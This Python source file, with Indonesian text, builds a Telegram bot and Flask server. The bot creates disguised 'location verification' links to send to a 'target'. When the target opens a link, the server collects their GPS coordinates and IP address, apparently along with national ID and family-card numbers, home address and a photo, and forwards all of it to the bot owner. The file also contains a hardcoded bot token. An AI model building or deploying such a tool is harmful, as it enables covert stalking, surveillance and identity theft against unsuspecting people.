#!/usr/bin/env python3
"""
GPS Tracker Bot - Simple Link Tracking
Buat link → kirim ke target → target buka → GPS terkirim → notif ke bot
"""

import os
import sqlite3
import hashlib
import time
import asyncio
import base64
from io import BytesIO
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845527390:AAH1RZGR9zuYM7Se_O5171QwgnhQ6gs85dY")
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")
DASHBOARD_TOKEN = os.environ.get("DASHBOARD_TOKEN", "admin123")
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.db")

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS links (
        id TEXT PRIMARY KEY, tracking_id TEXT UNIQUE,
        title TEXT, description TEXT,
        created_by INTEGER, created_at TEXT, is_active INTEGER DEFAULT 1)""")
    c.execute("""CREATE TABLE IF NOT EXISTS tracking_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT, tracking_id TEXT,
        latitude REAL, longitude REAL, accuracy REAL,
        user_agent TEXT, ip_address TEXT, timestamp TEXT)""")
    conn.commit()
    conn.close()

def gen_id():
    return hashlib.md5(f"{time.time()}{os.urandom(8)}".encode()).hexdigest()[:10]

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    result = c.fetchall()
    conn.close()
    return result

# ============ TELEGRAM BOT ============
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
        [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
        [InlineKeyboardButton("🔔 Cek Notifikasi", callback_data="check_notif")],
        [InlineKeyboardButton("🗺 Lihat Peta", callback_data="view_map")],
        [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
    ]
    text = (
        "🚚 *GPS Tracker Bot*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Buat link tracking, kirim ke target,\n"
        "terima notifikasi lokasi otomatis!\n\n"
        "📌 *Fitur:*\n"
        "• Buat link tracking\n"
        "• Kirim link ke target\n"
        "• Notifikasi lokasi otomatis\n"
        "• Lihat peta & riwayat\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Pilih menu 👇"
    )
    try:
        banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "banner.jpg")
        with open(banner_path, "rb") as f:
            await update.message.reply_photo(photo=f)
    except Exception as e:
        print(f"Banner error: {e}")
    # Send menu text separately so edit_message_text works on callbacks
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )

async def on_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try: await q.answer()
    except: pass

    uid = q.from_user.id
    d = q.data

    if d == "create_link":
        tid = gen_id()
        title = "Verifikasi Lokasi"
        desc = "Silakan konfirmasi lokasi Anda"
        db_exec("INSERT INTO links VALUES (?,?,?,?,?,?,1)",
                (tid, tid, title, desc, uid, datetime.now().isoformat()))
        url = f"{BASE_URL}/track/{tid}"
        kb = [
            [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={url}")],
            [InlineKeyboardButton("📋 Daftar Link", callback_data="list_links")],
            [InlineKeyboardButton("⬅️ Menu", callback_data="home")],
        ]
        await q.edit_message_text(
            f"✅ *Link Berhasil Dibuat!*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔗 *Link:*\n`{url}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📤 Kirim link ini ke target.\n"
            f"Saat dibuka & GPS diizinkan,\n"
            f"notifikasi lokasi otomatis ke sini.\n\n"
            f"🆔 `{tid}`",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "list_links":
        rows = db_exec("SELECT tracking_id,title,created_at,is_active FROM links WHERE created_by=? ORDER BY created_at DESC", (uid,))
        if not rows:
            await q.edit_message_text("📋 *Daftar Link*\n\nBelum ada link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Buat", callback_data="create_link")]]),
                parse_mode="Markdown")
            return
        text = "📋 *Daftar Link*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        kb = []
        for tid, title, cat, active in rows:
            st = "🟢" if active else "🔴"
            ev = db_exec("SELECT COUNT(*) FROM tracking_events WHERE tracking_id=?", (tid,))[0][0]
            text += f"{st} `{tid}` | 🔔 {ev}x | 📅 {cat[:10]}\n"
            kb.append([
                InlineKeyboardButton(f"🔔 {tid[:6]}", callback_data=f"ev:{tid}"),
                InlineKeyboardButton("🗺", callback_data=f"map:{tid}"),
                InlineKeyboardButton("⏸" if active else "▶️", callback_data=f"tg:{tid}"),
                InlineKeyboardButton("🗑", callback_data=f"del:{tid}"),
            ])
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("ev:"):
        tid = d.split(":")[1]
        evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 5", (tid,))
        if not evs:
            await q.edit_message_text(f"🔔 *Notifikasi*\n\nBelum ada event untuk `{tid}`.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]),
                parse_mode="Markdown")
            return
        text = f"🔔 *Notifikasi - `{tid}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, (lat, lon, acc, ts) in enumerate(evs):
            text += f"📍 #{i+1} | 🕐 {ts[:19]}\n   📐 `{lat:.6f}, {lon:.6f}` | 🎯 ±{acc:.0f}m\n\n"
        kb = [[InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={evs[0][0]},{evs[0][1]}")],
              [InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("map:"):
        tid = d.split(":")[1]
        evs = db_exec("SELECT latitude,longitude,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (tid,))
        if evs:
            kb = [
                [InlineKeyboardButton("🌐 Peta Lengkap", url=f"{BASE_URL}/map/{tid}")],
                [InlineKeyboardButton("📍 Google Maps", url=f"https://www.google.com/maps?q={evs[0][0]},{evs[0][1]}")],
                [InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")],
            ]
            await q.edit_message_text(
                f"🗺 *Peta - `{tid}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📍 Terakhir: {evs[0][2][:19]}\n📐 `{evs[0][0]:.6f}, {evs[0][1]:.6f}`",
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        else:
            await q.edit_message_text("🗺 *Peta*\n\nBelum ada data.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]),
                parse_mode="Markdown")

    elif d.startswith("del:"):
        tid = d.split(":")[1]
        db_exec("DELETE FROM links WHERE tracking_id=? AND created_by=?", (tid, uid))
        db_exec("DELETE FROM tracking_events WHERE tracking_id=?", (tid,))
        await q.edit_message_text(f"🗑 `{tid}` dihapus.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Daftar", callback_data="list_links")]]),
            parse_mode="Markdown")

    elif d.startswith("tg:"):
        tid = d.split(":")[1]
        db_exec("UPDATE links SET is_active=1-is_active WHERE tracking_id=? AND created_by=?", (tid, uid))
        row = db_exec("SELECT is_active FROM links WHERE tracking_id=? AND created_by=?", (tid, uid))
        status = "Aktif 🟢" if row and row[0][0] else "Nonaktif 🔴"
        await q.edit_message_text(f"✅ `{tid}` → {status}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Daftar", callback_data="list_links")]]),
            parse_mode="Markdown")

    elif d == "check_notif":
        links = db_exec("SELECT tracking_id FROM links WHERE created_by=? AND is_active=1", (uid,))
        text = "🔔 *Cek Notifikasi*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        found = 0
        for (tid,) in links:
            evs = db_exec("SELECT latitude,longitude,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (tid,))
            if evs:
                found += 1
                text += f"📍 `{tid[:6]}` | 🕐 {evs[0][2][:19]}\n   📐 `{evs[0][0]:.6f}, {evs[0][1]:.6f}`\n\n"
        if not found:
            text += "Belum ada notifikasi.\n"
        kb = [[InlineKeyboardButton("📋 Semua Link", callback_data="list_links")],
              [InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "view_map":
        links = db_exec("SELECT tracking_id FROM links WHERE created_by=?", (uid,))
        active = []
        for (tid,) in links:
            evs = db_exec("SELECT latitude,longitude FROM tracking_events WHERE tracking_id=? LIMIT 1", (tid,))
            if evs:
                active.append((tid, evs[0]))
        if not active:
            await q.edit_message_text("🗺 *Peta*\n\nBelum ada data lokasi.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Buat Link", callback_data="create_link")]]),
                parse_mode="Markdown")
            return
        kb = [[InlineKeyboardButton(f"📍 {t[0][:6]}", url=f"{BASE_URL}/map/{t[0]}")] for t in active[:10]]
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await q.edit_message_text("🗺 *Peta Tracking*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih link:",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "home":
        kb = [
            [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
            [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
            [InlineKeyboardButton("🔔 Cek Notifikasi", callback_data="check_notif")],
            [InlineKeyboardButton("🗺 Lihat Peta", callback_data="view_map")],
            [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
        ]
        await q.edit_message_text("🚚 *GPS Tracker Bot*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih menu 👇",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

# ============ NOTIFICATION ============
async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
    info = db_exec("SELECT created_by FROM links WHERE tracking_id=?", (tracking_id,))
    if not info:
        return
    owner_id = info[0][0]
    bot = Bot(token=BOT_TOKEN)

    text = (
        f"🔔 *LOKASI BARU DITERIMA!*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 `{tracking_id}`\n"
        f"🕐 {datetime.now().strftime('%d/%m %H:%M:%S')}\n\n"
    )

    if data:
        text += (
            f"📋 *Data Penerima:*\n"
            f"👤 Nama: *{data.get('nama', '-')}*\n"
            f"🪪 No. KTP: `{data.get('no_ktp', '-')}`\n"
            f"📖 No. KK: `{data.get('no_kk', '-')}`\n"
            f"🏠 Alamat: {data.get('alamat', '-')}\n"
            f"🚧 RT/RW: {data.get('rt', '-')}/{data.get('rw', '-')}\n"
            f"🏙 Kota: {data.get('kota', '-')}\n"
            f"🗺 Provinsi: {data.get('provinsi', '-')}\n\n"
        )

    text += (
        f"📍 *Koordinat:*\n"
        f"   📐 `{lat:.6f}, {lon:.6f}`\n"
        f"   🎯 Akurasi: ±{accuracy:.0f}m\n"
        f"   🌐 IP: `{ip}`\n\n━━━━━━━━━━━━━━━━━━━━"
    )
    kb = [
        [InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={lat},{lon}")],
        [InlineKeyboardButton("📍 Street View", url=f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}")],
        [InlineKeyboardButton("📊 Riwayat", callback_data=f"ev:{tracking_id}")],
        [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
    ]
    try:
        photo_data = data.get('photo') if data else None
        if photo_data and photo_data.startswith('data:image'):
            # Send as photo with caption
            photo_bytes = base64.b64decode(photo_data.split(',')[1])
            photo_io = BytesIO(photo_bytes)
            photo_io.name = 'photo.jpg'
            await bot.send_photo(owner_id, photo_io, caption=text,
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        else:
            await bot.send_message(owner_id, text,
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    except Exception as e:
        print(f"Notif error: {e}")

# ============ FLASK ============
app = Flask(__name__, template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates"))
app.config['TEMPLATES_AUTO_RELOAD'] = True

@app.after_request
def skip_ngrok(response):
    response.headers["ngrok-skip-browser-warning"] = "true"
    return response

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/track/<tid>")
def track(tid):
    info = db_exec("SELECT tracking_id,title,description,is_active FROM links WHERE tracking_id=?", (tid,))
    if not info:
        return render_template("error.html", message="Link tidak ditemukan"), 404
    if not info[0][3]:
        return render_template("error.html", message="Link tidak aktif"), 403
    return render_template("track.html", tracking_id=tid, title=info[0][1], description=info[0][2])

@app.route("/api/location/<tid>", methods=["POST"])
def api_loc(tid):
    d = request.json
    lat, lon, acc = d.get("latitude"), d.get("longitude"), d.get("accuracy", 0)
    if lat is None or lon is None:
        return jsonify({"error": "Invalid"}), 400
    info = db_exec("SELECT is_active FROM links WHERE tracking_id=?", (tid,))
    if not info or not info[0][0]:
        return jsonify({"error": "Not found"}), 404
    db_exec("INSERT INTO tracking_events (tracking_id,latitude,longitude,accuracy,user_agent,ip_address,timestamp) VALUES (?,?,?,?,?,?,?)",
        (tid, lat, lon, acc, str(request.user_agent), request.remote_addr, datetime.now().isoformat()))
    # Save KTP data
    db_exec("UPDATE links SET title=?, description=? WHERE tracking_id=?",
        (d.get("nama",""), f"KK:{d.get('no_kk','')} | {d.get('alamat','')}", tid))
    asyncio.run(notify(tid, lat, lon, acc, request.remote_addr, d))
    return jsonify({"success": True})

@app.route("/map/<tid>")
def map_view(tid):
    info = db_exec("SELECT tracking_id,title,description,created_at FROM links WHERE tracking_id=?", (tid,))
    if not info:
        return render_template("error.html", message="Link tidak ditemukan"), 404
    evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC", (tid,))
    return render_template("map.html", tracking_id=tid, link_info=info[0], events=evs)

@app.route("/dashboard")
def dashboard():
    token = request.args.get("token", "")
    if token != DASHBOARD_TOKEN:
        return render_template("error.html", message="Akses ditolak. Token dashboard salah atau tidak disertakan."), 403
    return render_template("dashboard.html", token=token)

@app.route("/api/dashboard")
def api_dashboard():
    token = request.args.get("token", "")
    if token != DASHBOARD_TOKEN:
        return jsonify({"error": "unauthorized"}), 403

    import datetime
    from datetime import datetime as dt

    now = dt.now()
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0).isoformat()

    total_links = db_exec("SELECT COUNT(*) FROM links")[0][0]
    active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
    total_events = db_exec("SELECT COUNT(*) FROM tracking_events")[0][0]
    today_events = db_exec("SELECT COUNT(*) FROM tracking_events WHERE timestamp>=?", (today_start,))[0][0]
    total_users = db_exec("SELECT COUNT(DISTINCT created_by) FROM links")[0][0]

    recent_events = db_exec("""
        SELECT te.tracking_id, te.latitude, te.longitude, te.accuracy, te.timestamp,
               l.title as nama
        FROM tracking_events te
        LEFT JOIN links l ON te.tracking_id = l.tracking_id
        ORDER BY te.timestamp DESC LIMIT 20
    """)
    recent_events_list = []
    for row in recent_events:
        recent_events_list.append({
            "tracking_id": row[0], "latitude": row[1], "longitude": row[2],
            "accuracy": row[3], "timestamp": row[4], "nama": row[5] or ""
        })

    links = db_exec("SELECT tracking_id, title, created_at, is_active FROM links ORDER BY created_at DESC LIMIT 50")
    links_list = []
    for row in links:
        ev_count = db_exec("SELECT COUNT(*) FROM tracking_events WHERE tracking_id=?", (row[0],))[0][0]
        last_loc = db_exec("SELECT latitude, longitude FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (row[0],))
        lat, lng = last_loc[0] if last_loc else (None, None)
        links_list.append({
            "tracking_id": row[0], "title": row[1],
            "created_at": row[2], "is_active": bool(row[3]),
            "event_count": ev_count, "lat": lat, "lng": lng
        })

    latest_location = None
    latest = db_exec("""
        SELECT te.latitude, te.longitude, te.timestamp, te.tracking_id
        FROM tracking_events te
        ORDER BY te.timestamp DESC LIMIT 1
    """)
    if latest:
        latest_location = {"lat": latest[0][0], "lng": latest[0][1], "ts": latest[0][2], "tid": latest[0][3]}

    return jsonify({
        "total_links": total_links, "active_links": active_links,
        "total_events": total_events, "today_events": today_events,
        "total_users": total_users,
        "recent_events": recent_events_list,
        "links": links_list,
        "latest_location": latest_location,
        "generated_at": now.strftime("%Y-%m-%d %H:%M:%S")
    })

# ============ MAIN ============
def main():
    init_db()
    from threading import Thread
    Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False), daemon=True).start()
    print("🌐 Web server :5000")

    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", cmd_start))
    app_bot.add_handler(CommandHandler("help", cmd_start))
    app_bot.add_handler(CommandHandler("links", cmd_start))
    app_bot.add_handler(CommandHandler("map", cmd_start))
    app_bot.add_handler(CallbackQueryHandler(on_click))
    print("🤖 Bot running...")
    app_bot.run_polling()

if __name__ == "__main__":
    main()
